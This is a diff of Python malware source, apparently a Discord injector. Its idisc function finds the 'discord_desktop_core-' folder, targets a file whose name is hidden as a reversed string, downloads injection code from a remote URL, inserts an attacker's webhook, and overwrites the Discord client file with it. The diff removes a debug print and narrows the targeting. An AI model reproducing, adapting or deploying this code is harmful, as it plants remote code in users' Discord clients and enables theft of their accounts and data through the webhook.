@@ -399,8 +399,7 @@ def idisc():
         if os.path.isdir(folder_path):
             for root, dirs, files in os.walk(folder_path):
                 for file in files:
-                    print(file)
-                    if 'discord_desktop_core-' in root:
+                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                         file_path = os.path.join(root, file)
                         inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
                         with open(file_path, "w", encoding="utf-8") as f:
